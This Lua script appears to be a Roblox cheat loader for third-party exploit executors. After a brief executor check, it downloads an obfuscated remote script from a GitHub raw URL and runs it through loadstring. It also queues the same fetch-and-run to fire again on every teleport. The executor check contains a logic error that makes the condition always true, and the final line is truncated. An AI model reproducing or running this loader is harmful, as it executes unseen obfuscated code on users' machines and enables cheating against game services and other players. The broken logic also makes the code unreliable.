local queue = queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport)
local executorname
local function alert()
game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Check your console!",
	Text = "Type '/console' in chat!",
})
end

if identifyexecutor then
executorname = identifyexecutor()
else
print('continue')
end

if identifyexecutor then if executorname == "Delta" or "Codex" or "Hydrogen" then alert() print('Your executor: "' .. executorname .. '" does not support queue_on_teleport() UNC function, please message the developer of your executor "rexidtc" on Discord to fix it. Thank you.') task.wait(10000000) end end

queue('loadstring(game:HttpGet("https://raw.githubusercontent.com/fissurectomy/1x1.lua/main/obf_rJ8UD0i3dqgRzml4SDBqvQzRQZZbTC10yPenw69wMNRha17TH23tV5tiyr9Gz9XO.lua.txt"))()')
task.wait(0.2)
loadstring(game:HttpGet("https://raw.githubusercontent.com/fissurectomy/1x1.lua/main/obf_rJ8UD0i3dqgRzml4SDBqvQzRQZZbTC10yPenw69wMNRha17TH23tV5tiyr9Gz9XO.lua.txt"))(
